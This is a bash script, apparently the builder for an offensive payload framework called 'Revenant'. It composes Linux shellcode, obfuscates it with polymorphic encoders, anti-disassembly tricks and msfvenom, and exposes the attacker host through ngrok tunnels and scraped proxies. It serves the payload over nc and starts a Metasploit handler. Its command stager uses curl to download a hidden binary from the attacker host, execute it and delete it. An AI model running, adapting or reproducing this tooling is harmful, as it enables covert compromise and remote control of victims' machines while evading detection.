#!/bin/bash
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
grey=`tput setaf 8`
reset=`tput sgr0`
bold=`tput bold`
underline=`tput smul`
LHOST=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'`
GLOB=`curl -s http://whatismyip.akamai.com/`

print_info(){
    echo "[$underline$(date +'%H:%M')$reset] [*] - $1"
    echo
}      

print_good(){
    echo "[$underline$(date +'%H:%M')$reset] $green[+]$reset - $1"
    echo
}      

print_error(){
    echo "[$underline$(date +'%H:%M')$reset] $red[-]$reset - $1"
    echo
}      

print_banner(){
echo
echo
echo
echo "$bold$blue       :::::::::  :::::::::: :::     ::: :::::::::: ::::    :::     :::     ::::    ::: :::::::::::" 
echo "$bold$blue      :+:    :+: :+:        :+:     :+: :+:        :+:+:   :+:   :+: :+:   :+:+:   :+:     :+:"      
echo "$bold$blue     +:+    +:+ +:+        +:+     +:+ +:+        :+:+:+  +:+  +:+   +:+  :+:+:+  +:+     +:+"       
echo "$bold$blue    +#++:++#:  +#++:++#   +#+     +:+ +#++:++#   +#+ +:+ +#+ +#++:++#++: +#+ +:+ +#+     +#+"        
echo "$bold$blue   +#+    +#+ +#+         +#+   +#+  +#+        +#+  +#+#+# +#+     +#+ +#+  +#+#+#     +#+"         
echo "$bold$blue  #+#    #+# #+#          #+#+#+#   #+#        #+#   #+#+# #+#     #+# #+#   #+#+#     #+#"          
echo "$bold$blue ###    ### ##########     ###     ########## ###    #### ###     ### ###    ####     ###"    
echo $reset
echo
echo "                              redcodelabs.io $red< * >$reset [v1.1-dev]"
echo
echo
echo "$bold$blue [ : : ] Construct payload: $reset" 
echo
echo
echo "~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ $red[ PAYLOAD START ]$reset ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ "
echo
}

nasm_compile(){
    filename=$1
    format=$2
    filename_base=${filename%.asm}
    nasm -f $format $filename
    ld ${filename}.o -o ${filename_base}
    rm *.o
}

ip2hex(){
    ip_addr=$1
    splitted="${ip_addr//./ }"   
    ip_hex="$(printf '%02X' $(echo $splitted))"   
    echo 0x$ip_hex | tr '[:upper:]' '[:lower:]'  
}

bin2opcodes(){
    echo "$(xxd -i $1|sed '$ d'| sed '$ d'|sed '1,1d'|tr '\n' ' ');"
}

random_str(){
    echo $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1)
}

run_bg(){
   $@ > /dev/null 2>&1 &
}

clear
print_banner
#sleep 1.5

use_nodes="no"
curl_speed="42000000g"
use_cmdstager=0
multi_node=""
lport=$((3333 + $RANDOM % 9999))
lp_1=$lport
lp_2=$lport
lp_3=$lport
lp_4=$lport
lh_1=$LHOST
lh_2=$LHOST
lh_3=$LHOST
lh_4=$LHOST
exit_after_compile=0
proxy=""
elf_infector=0
arch="x64"
selected_encoder="generic/none"
encoder_iterations=0
venom_format="elf"
vm_action="exit(0)"
use_preprocessor=1
raw_blob=0
region="us"
tunnel=0
psize=0
stager_size=0
token=$(shuf -n 1 tokens.txt)
handler_setup_cmd=""
generate_stager=1
sc_exec=0
server_lock=""
run_bg=0
if_smaller=0
tunnel_sleep_time=6
rm src/current_payload.c
badchars="\x00"
default_platform="linux"
nops_args=""
encrypt_args=""
compilation_cmd="./scc --arch x64 -f bin -o bin/payload"
polymorph_seed=0x$(shuf -i 1-10000000 -n 1)
payload_skeleton=""
payload_core=""
payload_suggester="[ FINISH PAYLOAD COMPOSITION ]"
for f in payloads/*; do
    descr=$(head -1 $f|cut -d "/" -f 3)
    pname=$(echo $f|sed 's/payloads//'|tr -d "/" )
    payload_suggester="${payload_suggester}\n[=] $descr - $pname"
done
while :
do
selected_payload=$(echo -e "${payload_suggester}"| rofi -p '[::] Payload Builder Interface >> ' -theme themes/blue.rasi -dmenu)
if [[ $selected_payload =~ "FINISH" ]]; then
    echo
    echo "~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ $red[  PAYLOAD END  ]$reset ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~"
    echo
    break       	   
fi
[[ $payload =~ "FINISH" ]] && break || payload_name="payloads/$(echo $selected_payload|awk '{print $NF}')";  payload_core=$(cat $payload_name|tail -n +2);echo "$payload_core" >> src/current_payload.c; echo "$magenta$payload_core$reset"|lolcat 
done
nano src/current_payload.c
sleep 0.8
echo "$blue [ : : ] Tweak payload parameters: $reset" 
echo
while true
do
additional_config=$(echo -e "[ COMPILE PAYLOAD ]
[0x01] --- [msf]  Extended bad characters removal
[0x02] --- [scc]  Random return and stack registers
[0x03] --- [scc]  Insert anti-disasm instructions
[0x07] --- [rev]  Do not generate a stager
[0x08] --- [scc]  Initiate static seed for polymorphic engine
[0x11] --- [scc]  Explicitly generate polymorphic, position-independent code
[0x12] --- [msf]  Prepend a nopsled chain
[0x13] --- [rev]  Run payload after compilation
[0x14] --- [rev]  Append raw binary blob to the payload
[0x16] --- [scc]  Enable size optimalization
[0x17] --- [scc]  Preserve values of specific registers
[0x18] --- [rev]  Expand operative effectiveness to WAN profiles (ELF delivery via reverse tunnel) 
[0x23] --- [rev]  Disable source pre-processing
[0x26] --- [rev]  Select alternative tunnel authtoken
[0x27] --- [msf]  Encode payload multiple times 
[0x30] --- [scc]  Randomly insert a number of breakpoint instructions (0xCC) 
[0x31] --- [rev]  Select a new sock5 proxy for the tunnel 
[0x32] --- [rev]  When no tunnel is used, use the global IP address of the host for serving the payload 
[0x33] --- [rev]  Exit after payload generation 
[0x34] --- [msf]  Use command stager payload instead of raw ELF loader 
[0x35] --- [rev]  Tune maximum command stager connection speed 
[0x39] --- [rev]  Modify tunnel setup timeout
"| rofi -p 'Revenant ~ ' -theme themes/material.rasi -dmenu)
if [[ $additional_config =~ "COMPILE" ]]; then
    break       	   
fi
if [[ $additional_config =~ "[0x01]" ]]; then
    badchars=$(echo -e "\\\\x00\\\\x0a\\\\x0d\\\\xff\\\\x0b\n\\\\xff\n\\\\x0d\\\\xff\\\\x09\n\\\\x0b\\\\xff"| rofi -p '[*] Choose patterns to avoid: ' -theme themes/purple.rasi -dmenu)
    print_info "Expanded set of restricted characters ($blue$bold$badchars$reset)"
fi
if [[ $additional_config =~ "[0x02]" ]]; then
    possible_regs=("r9" "r8" "r10" "r11" "r12" "r13" "r14" "r15")
    rndg=$((1 + $RANDOM % 1000))
    stack_reg=${possible_regs[$rndg % ${#possible_regs[@]}]}
    rndg=$((1 + $RANDOM % 1000))
    return_reg=${possible_regs[$rndg % ${#possible_regs[@]}]}
    print_info "New return register ($blue$bold$return_reg$reset)"
    print_info "New stack register ($blue$bold$stack_reg$reset)"
fi
if [[ $additional_config =~ "[0x03]" ]]; then
    selected_disasm_freq=$(echo -e "x 10\nx 20\nx 50\nx 100\nx 200"| rofi -p '[*] Select disassembly emitter frequency' -theme themes/purple.rasi -dmenu)
    freq=$(echo $selected_disasm_freq|awk '{print $NF}')
    compilation_cmd="${compilation_cmd} --anti-disasm --anti-disasm-freq $freq"
fi
if [[ $additional_config =~ "[0x07]" ]]; then
    generate_stager=0
    print_info "Disabled staged payload setup"
fi
if [[ $additional_config =~ "[0x08]" ]]; then
    polymorph_seed=0x$(echo -e ""| rofi -p '[*] Enter desired seed value ' -theme themes/purple.rasi -dmenu)
    print_info "Initialized random seed ($blue$polymorph_seed$reset)"
fi
if [[ $additional_config =~ "[0x11]" ]]; then
    compilation_cmd="${compilation_cmd} --pie --polymorph --seed $polymorph_seed"
    print_info "Poly encoder started ($blue$polymorph_seed$reset)"
fi
if [[ $additional_config =~ "[0x12]" ]]; then
    nopsled=$(echo -e "none 0 \nhundred_bytes 100\nhalf_mb 512\npage 4096\n10k 10240 "| rofi -p '[*] Select nopsled size (can be custom int): ' -theme themes/purple.rasi -dmenu)
    nops_len=$(echo $nopsled|awk '{print $NF}')
    nops_args="${nops_args} -n ${nops_len}"
    print_info "Initiated NOP sled (length: $blue$nops_len$reset)"
fi
if [[ $additional_config =~ "[0x13]" ]]; then
    sc_exec=1
    print_info "Scheduled payload execution after compilation (${red}WARNING$reset)"
fi
if [[ $additional_config =~ "[0x14]" ]]; then
    compilation_cmd="${compilation_cmd} --concat"
    raw_blob=$(echo -e $current_dir_files | rofi -p '[*] Select raw .bin file: ' -theme themes/purple.rasi -dmenu)
    print_info "Extended payload with raw .bin file (length: ${blue}+$(wc -c $raw_blob|awk '{printf $1}') bytes)"
fi
if [[ $additional_config =~ "[0x16]" ]]; then
    compilation_cmd="${compilation_cmd} -Os --max-length 4096"
    print_info "Size optimalization ${blue}ENABLED$reset"
    print_info "Set maximum output size to PAGESIZE (${blue}4096$reset)"
fi
if [[ $additional_config =~ "[0x17]" ]]; then
    for register in $(echo -e "rax rbx rcx rdx\neax ebx ecx edx\nr8 r9 r10 r11\nr12 r13 r14 r15\nrsp\nesp"| rofi -p '[*] Specify which registers to preserve' -theme themes/purple.rasi -dmenu); do
        compilation_cmd="${compilation_cmd} --preserve ${register}"
        print_info "Wrapped payload with PUSH-POP restorer (${blue}${register}${reset})"
    done
fi
if [[ $additional_config =~ "[0x18]" ]]; then
    use_nodes=$(echo -e "--> yes\n--> no" | rofi -p '[*] Use multiple tunnel nodes in stager?' -theme themes/purple.rasi -dmenu|awk '{printf $NF}')
    multi_node=$(cat src/multi_node.asm)
    tunnel=1
    print_info "Enabled reverse tunneling"
fi
if [[ $additional_config =~ "[0x23]" ]]; then
    use_preprocessor=0
    print_info "Disabled pre-processor engine"
fi
if [[ $additional_config =~ "[0x26]" ]]; then
    sel=""
    i=0
    for tkn in $(cat tokens.txt); do
        sel="${sel}\n[$i] $tkn"
        ((i++))
    done
    token=$(echo -e "$sel" | rofi -p "Token -> " -theme themes/purple.rasi -dmenu|awk '{printf $NF}')
    print_info "Initialized new token ($blue$token$reset)"
fi
if [[ $additional_config =~ "[0x27]" ]]; then
    selected_encoder=$(echo -e "generic/none\nx64/xor\nx64/xor_context\nx64/xor_dynamic\nx64/zutto_dekiru\nx64/random" | rofi -p '[*] Select encoder: ' -theme themes/purple.rasi -dmenu)
    if [[ $selected_encoder =~ "random" ]]; then
        possible_encoders=("x64/xor" "x64/xor_context" "x64/xor_dynamic" "x64/zutto_dekiru")
        rndg=$((1 + $RANDOM % 1000))
        selected_encoder=${possible_encoders[$rndg % ${#possible_encoders[@]}]}
    fi
    selected_encoder_force=$(echo -e "-> none [0x]\n-> small    [1-5x]\n-> standard [5-15x]\n-> huge     [15-35x]\n-> insane   [35-100x]"| rofi -p '[*] Adjust encoding iter force: ' -theme themes/purple.rasi -dmenu)
    iter_first=$(echo $selected_encoder_force|awk -F'-' '{print $NF-1}'|tr -dc '0-9')
    iter_last=$(echo $selected_encoder_force|awk -F'-' '{print $NF}'|tr -dc '0-9')
    encoder_iterations=$(shuf -i ${iter_first}-${iter_last} -n 1)
    print_info "Selected encoder ($blue$selected_encoder$reset)"
    print_info "Iterations -> $blue$encoder_iterations$reset"
fi
if [[ $additional_config =~ "[0x30]" ]]; then
    num_breakpoints=0x$(echo -e "10\n20\n50\n100"| rofi -p '[*] Enter desired number of inserted breakpoints ' -theme themes/dmenu.rasi -dmenu)
    breakpoint="__breakpoint();"
    num_lines=$(wc -l src/current_payload.c|awk '{printf $1}')
    for (( i=0; i<$num_breakpoints; i++ )); do
        insert_pos=$((1 + $RANDOM % $num_lines))
        sed -i "$insert_pos i $breakpoint" src/current_payload.c
    done
    print_info "Inserted $bold$blue$num_breakpoints$reset breakpoint instructions"
fi
if [[ $additional_config =~ "[0x31]" ]]; then
    cmpl=""
    for i in {0..10}; do
        resp=$(curl -s "https://gimmeproxy.com/api/getProxy?protocol=http")
        addr=$(echo "$resp"|grep ipPort|awk '{printf $NF}')
        addr=${addr//,}
        addr=${addr//\"}
        proto=$(echo "$resp"|grep protocol|awk '{printf $2}')
        proto=${proto//,}
        proto=${proto//\"}
        country=$(echo "$resp"|grep country|awk '{printf $2}')
        country=${country//,}
        country=${country//\"}
        anon=$(echo "$resp"|grep country|awk '{printf $2}')
        anon=${anon//,}
        cmpl="${cmpl}\n\$ $addr [$country - $proto] (anon: $anon)"
    done
    proxy_addr=$(echo -e "${cmpl}" | rofi -p '[*] Select proxy server: ' -theme themes/purple.rasi -dmenu|awk '{printf $2}')
    proxy="socks5_proxy: \"socks5://$proxy_addr\""
fi
if [[ $additional_config =~ "[0x32]" ]]; then
    lh_1=$GLOB
    LHOST=$GLOB
    print_info "Using global IP address inside stager ($blue$bold$lh_1$reset)"
fi
if [[ $additional_config =~ "[0x33]" ]]; then
    exit_after_compile=1
    print_info "Scheduled exit after payload composition"
fi
if [[ $additional_config =~ "[0x34]" ]]; then
    use_cmdstager=1
    print_info "Switched stager ($bold${blue}$reset)"
fi
if [[ $additional_config =~ "[0x35]" ]]; then
    curl_speed=$(echo -e "800m (fast)\n150m (decent)\n100k (slow)" | rofi -p '[*] Tune download speed: ' -theme themes/purple.rasi -dmenu|awk '{printf $1}')
    print_info "Changed max binary retrieval speed for command stager ($bold$blue$curl_speed$reset)"
fi
if [[ $additional_config =~ "[0x39]" ]]; then
    tunnel_sleep_time=12
    print_info "Modified tunnel setup timeout ($blue${bold}12$reset seconds )"
fi
sleep 1.2
done
if [ $use_preprocessor -eq 1 ]; then
    prp=0
    echo "$blue [ : : ] Pre-processor engine: $reset" 
    echo
    for ip in $(cat src/current_payload.c|grep -o '[0-9]\{0,3\}\.[0-9]\{0,3\}\.[0-9]\{0,3\}\.[0-9]\{0,3\}' | awk 'NR%2{printf $0"\t";next;}1'); do
        hex_val=$(ip2hex $ip|awk '{printf $1}')
        sed -i "s/$ip/$hex_val/" src/current_payload.c
        print_info "[$ip = $blue$hex_val$reset]"
        ((prp++))
    done
    cat src/current_payload.c |grep fork > /dev/null
    if [ $? -eq 0 ]; then
        cpl="$(cat src/current_payload.c)
    wait(0);"
        echo "$cpl" > src/current_payload.c
        print_info "[FORK = $blue+wait(0)$reset]"
        ((prp++))
    fi
    if [[ "$(cat src/current_payload.c)" =~ "VM_ACTION" ]]; then
        sed -i "s/VM_ACTION/$vm_action/" src/current_payload.c
        print_info "[VM_ACTION = $blue$vm_action$reset]"
        ((prp++))
    fi
    if [[ "$(cat src/current_payload.c)" =~ "CURRENT_TIME" ]]; then
        current_time=$(date '+%s')
        sed -i "s/CURRENT_TIME/$current_time/" src/current_payload.c
        print_info "[TIME = $blue$current_time$reset]"
        ((prp++))
    fi
    if [[ "$(cat src/current_payload.c)" =~ "LHOST_IP" ]]; then
        sed -i "s/LHOST_IP/$LHOST/" src/current_payload.c
        print_info "[LHOST IP = $blue$LHOST$reset]"
        ((prp++))
    fi
    if [[ "$(cat src/current_payload.c)" =~ "SSH_KEY" ]]; then
        pkey=$(cat ~/.ssh/id_rsa.pub)
        sed -i "s/SSH_KEY/$pkey/" src/current_payload.c
        print_info "[SSH_KEY = $blue$current_time$reset]"
        ((prp++))
    fi
    if [[ "$(cat src/current_payload.c)" =~ "LHOST" ]]; then
        lhost_addr=$(ip2hex $LHOST)
        sed -i "s/LHOST/$lhost_addr/" src/current_payload.c
        print_info "[LHOST = $blue$lhost_addr$reset <-> $LHOST]"
        ((prp++))
    fi
    if [ $prp -eq 0 ]; then
        print_info "No pre-processor triggers found"
    fi
fi
cpl="#include \"src/constants.h\"
int main(){
$server_lock
$(cat src/current_payload.c)
}"
echo "$cpl" > src/current_payload.c
echo "$bold$blue [ : : ] Compiler: $reset" 
compilation_cmd="${compilation_cmd} --platform $default_platform"
$compilation_cmd src/current_payload.c > .dbg 2>&1 
if [ $? -eq 0 ]; then
    echo
    print_good "Payload translation successful (${blue}C-99$reset -> ${blue}hex$reset)"
    print_info "Size -> $green$bold$(wc -c bin/payload|awk '{printf $1}')$reset bytes"
else
    echo "$red [!] PAYLOAD COMPILATION ERROR [!]"
    echo 
    echo "$yellow$(cat .dbg)$reset"
    echo
    exit
fi
if [ $sc_exec -eq 1 ]; then
    print_info "Running payload..."
    xxd -ps -c 20 bin/payload|./runner 
fi
#if [ $raw_blob ! -eq 0 ]; then
#    cat bin/payload $raw_blob > bin/payload
#fi
msfvenom -a $arch --platform linux -p generic/custom -o bin/self -f $venom_format -b '$badchars' -e $selected_encoder -i $encoder_iterations $nops_args $encrypt_args PAYLOADFILE=bin/payload ARCH=$arch PLATFORM=linux > .vnm_dbg 2>&1 
if [ $? -eq 0 ]; then
    #clear
    psize=$(wc -c bin/self|awk '{printf $1}')
    print_good "Generated ELF payload ($blue$psize$reset bytes)"
    echo
    hexyl bin/self
    if [ $exit_after_compile -eq 1 ]; then
        print_info "Saved payload as $blue${bold}bin/self${reset}"
        exit
    fi
    echo
else
    echo "$red [!] ELF GENERATION ERROR [!]"
    echo 
    echo "$yellow$(cat .vnm_dbg)$reset"
    echo
    exit
fi
if [ $tunnel -eq 1 ]; then
    cnf=$(sed "s/AUTHTOKEN/$token/" conf.yml)
    cnf=$(echo "$cnf"|sed "s/REGION/$region/")
    cnf=$(echo "$cnf"|sed "s/LPORT/$lport/")
    cnf=$(echo "$cnf"|sed "s/PROXY/$proxy/")
    echo "$cnf" > cnf.yml
    ngrok start --config cnf.yml --all &>/dev/null &
    if [ $? -eq 0 ]; then
        print_info "Initiated client ($bold$blue$token$reset)"
    else
        print_error "Tunnel setup error"
        exit
    fi
    sleep $tunnel_sleep_time
    rsp=$(curl -s http://localhost:7777/api/tunnels|jq .tunnels)
    extern_addr_1=$(echo "$rsp"|jq ".[0]"|jq .public_url)
    lh_1=$(dig $(echo $extern_addr_1|sed "s/tcp://"|tr / " "|awk -F':' '{printf $1}') +short)  
    lp_1=$(echo $extern_addr_1|sed "s/tcp://"|tr / " "|awk -F':' '{printf $NF}'|tr \" " ")  
    extern_addr_2=$(echo "$rsp"|jq ".[1]"|jq .public_url)
    lh_2=$(dig $(echo $extern_addr_2|sed "s/tcp://"|tr / " "|awk -F':' '{printf $1}') +short)  
    lp_2=$(echo $extern_addr_2|sed "s/tcp://"|tr / " "|awk -F':' '{printf $NF}'|tr \" " ")  
    extern_addr_3=$(echo "$rsp"|jq ".[2]"|jq .public_url)
    lh_3=$(dig $(echo $extern_addr_3|sed "s/tcp://"|tr / " "|awk -F':' '{printf $1}') +short)  
    lp_3=$(echo $extern_addr_3|sed "s/tcp://"|tr / " "|awk -F':' '{printf $NF}'|tr \" " ")  
    extern_addr_4=$(echo "$rsp"|jq ".[3]"|jq .public_url)
    lh_4=$(dig $(echo $extern_addr_4|sed "s/tcp://"|tr / " "|awk -F':' '{printf $1}') +short)  
    lp_4=$(echo $extern_addr_4|sed "s/tcp://"|tr / " "|awk -F':' '{printf $NF}'|tr \" " ")  

    caddr=$LHOST
    cport=$lport
    #lport=lp_1
    print_info "Started reverse tunnel ($blue$caddr$reset:$blue$cport$reset <--> $blue$lh_1$reset:$blue$lp_1$reset)"
    if [[ $use_nodes =~ "yes" ]]; then
        print_info "Using 4 addresses:" 
        echo "$magenta \$   $lh_1 : $lp_1$reset"
        echo "$magenta \$   $lh_2 : $lp_2$reset"
        echo "$magenta \$   $lh_3 : $lp_3$reset"
        echo "$magenta \$   $lh_4 : $lp_4$reset"
        echo
    else
        print_info "Obtained tunnel address -> $red$lh_1:$lp_1$reset"
    fi
fi
echo

if [ $generate_stager -eq 1 ]; then
    print_info "Compiling stager..."
    cp src/stager.asm src/stg.asm
    sed -i "s/LP_1/$(ip2hex $lp_1)/" src/stg.asm
    sed -i "s/LH_1/$(ip2hex $lh_1)/" src/stg.asm
    if [[ $use_nodes =~ "yes" ]]; then
        cat src/multi_node.asm >> src/stg.asm
        sed -i 's/MULTI_NODE/$(cat src/multi_node.asm)/' src/stg.asm
        sed -i "s/LP_2/$(ip2hex $lp_2)/" src/stg.asm
        sed -i "s/LH_2/$(ip2hex $lh_2)/" src/stg.asm
        sed -i "s/LP_3/$(ip2hex $lp_3)/" src/stg.asm
        sed -i "s/LH_3/$(ip2hex $lh_3)/" src/stg.asm
        sed -i "s/LP_4/$(ip2hex $lp_4)/" src/stg.asm
        sed -i "s/LH_4/$(ip2hex $lh_4)/" src/stg.asm
    fi
    echo "" >> src/stg.asm
    cat src/mfd.asm >> src/stg.asm
    nasm -f bin src/stg.asm -o bin/stg > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        stager_size=$(wc -c bin/stg|awk '{printf $1}')
        print_info "Stager compilation successful (size: $blue$stager_size$reset bytes)"
    else
        print_error "Stager compilation error"
        exit
    fi
    cat bin/self | nc -lnkvp $lport > /dev/null 2>&1 &
    print_info "Started ELF payload server (port -> $blue$bold$lport$reset)"
fi

print_info "Starting Metasploit Framework Console"

if [ $use_cmdstager -eq 1 ]; then
    rnd_name=$(random_str 3)
    msf_rc="
    setg payload linux/x64/exec
    setg ARCH x64
    setg PLATFORM linux
    setg CMD \"curl --limit-rate $curl_speed -s -o .$rnd_name http://$lh_1:$lp_1; ./.$rnd_name &; rm .$rnd_name\"
    setg AppendExit true
    setg PrependChrootBreak true
    setg PrependFork true
    setg PrependSetresuid true
    set PROMPT %blu[s:%S | j:%J] (%L) [::] $
    $handler_setup_cmd"
else
    msf_rc="
    setg payload generic/custom
    setg ARCH x64
    setg PLATFORM linux
    setg PAYLOADFILE bin/stg
    set PROMPT %blu %T [ s:%S / j:%J ] %L (%U=%H)
    $handler_setup_cmd"
fi
echo "$msf_rc" > msf.rc
sudo msfconsole -q -n -r msf.rc #> /dev/null 2>&1 
